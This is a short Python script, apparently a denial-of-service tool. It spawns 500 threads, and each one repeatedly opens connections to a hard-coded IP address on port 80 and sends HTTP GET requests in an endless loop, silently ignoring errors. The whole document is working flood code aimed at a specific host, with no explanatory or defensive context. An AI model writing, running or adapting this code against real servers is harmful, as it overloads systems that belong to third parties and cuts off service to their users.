import socket
import threading

DEST_IP = '162.144.14.62'
SRC_IP = 'notarealIPanymore'
PORT = 80

def hive():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((DEST_IP, PORT))
            s.sendall("GET / HTTP/1.1\r\nHost: dummyhost.com\r\n\r\n".encode())
            s.close()
        except:
            continue

def main():
    for i in range(500):
        print(i)
        thread = threading.Thread(target=hive)
        thread.start()

main()
